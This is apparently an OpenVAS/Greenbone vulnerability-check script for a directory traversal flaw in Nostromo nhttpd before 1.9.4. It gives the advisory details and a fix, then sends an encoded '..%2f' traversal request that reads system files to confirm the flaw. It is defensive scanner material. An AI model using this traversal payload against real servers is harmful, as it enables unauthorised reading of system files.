if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802010" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-03-22 08:43:18 +0100 (Tue, 22 Mar 2011)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "Nostromo nhttpd Webserver Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/archive/1/517026/100/0/threaded" );
	script_xref( name: "URL", value: "http://www.redteam-pentesting.de/en/advisories/rt-sa-2011-001/-nostromo-nhttpd-directory-traversal-leading-to-arbitrary-command-execution" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_dependencies( "gb_get_http_banner.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80, 8080 );
	script_mandatory_keys( "nostromo/banner" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application." );
	script_tag( name: "affected", value: "Nostromo nhttpd Version prior to 1.9.4" );
	script_tag( name: "insight", value: "The flaw is due to an error in validating '%2f..' sequences in the
  URI causing attackers to read arbitrary files." );
	script_tag( name: "solution", value: "Upgrade to Nostromo nhttpd to 1.9.4 or later." );
	script_tag( name: "summary", value: "The host is running Nostromo nhttpd web server and is prone to
  directory traversal vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "http://www.nazgul.ch/dev_nostromo.html" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!ContainsString( banner, "Server: nostromo" )){
	exit( 0 );
}
files = traversal_files( "linux" );
for file in keys( files ) {
	path = "/..%2f..%2f..%2f..%2f..%2f..%2f..%2f/" + files[file];
	if(http_vuln_check( port: port, url: path, pattern: file, check_header: TRUE )){
		report = http_report_vuln_url( port: port, url: path );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

